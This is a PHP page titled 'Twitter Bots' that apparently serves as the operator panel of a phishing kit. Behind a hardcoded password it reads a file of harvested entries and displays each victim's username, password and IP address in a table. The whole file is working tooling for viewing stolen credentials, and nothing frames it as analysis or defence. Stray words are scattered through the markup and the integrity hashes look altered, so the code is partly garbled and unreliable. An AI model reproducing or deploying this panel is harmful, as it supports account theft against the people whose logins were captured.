
<!DOCTYPE html>
<html lang="en">
the <head>
 <meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Twitter Bots</title>
 <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjvme1fgjwpgmkzs7" crossorigin="anonymous">
<style>
 body {
height:100%;
width:100%;
 background-image: url("https://mal.sec.gd/images/bgSlider/img01.png");
 background-repeat: no-repeat;
background-size:cover;
}
 .space {
 margin-top: 5vh;
}
</style>
</head>
the <body>
 <div class="container space">
 <div class="alert alert-danger">
<?php
if (!isset($_POST["pass"])) {
?>
 <form method="POST" action="#">
 <input name="pass" type="password" class="form-control" placeholder="Password"><br/>
 <button class="btn btn-danger btn-lg btn-block" type="submit">Enter</button>
</form>
<?php
exit;
} else {
if ($_POST["pass"] != "b3rn4t1x3r") {
?>
 <div class='alert alert-warning' role='alert'>incorrect Password</div>
 <form method="POST" action="#">
 <input name="pass" type="password" class="form-control" placeholder="Password"><br/>
 <button class="btn btn-danger btn-lg btn-block" type="submit">Enter</button>
</form>
<?php
} else {
?>
 <div class="text-right"><a class="btn btn-danger" href="">Exit</a></div>
 <h2>user Data</h2><hr/>
 <table class="table table-striped">
<thead>
a <tr>
<th>User</th>
<th>Password</th>
<th>IP</th>
</tr>
</thead>
<tbody>
<?php
 $file = fopen('datos.txt','r');
 while ($line = fgets($file)) {
 $array = explode('<:>', trim($line));
 echo "<tr>";
 echo "<th><font color='green'>". $array[0] ."</font></th>";
 echo "<th><font color='green'>". $array[1] ."</font></th>";
 echo "<th><font color='green'>". $array[2] ."</font></th>";
 echo "</tr>";
}
fclose($file);
?>
</tbody>
</table>
</div>
<?php
}
}
?>
</div>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
 <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js" integrity="sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37prr3j5elqxss1yvqotnepnhvp9aj7xs" crossorigin="anonymous"></script>
</body>
</html>
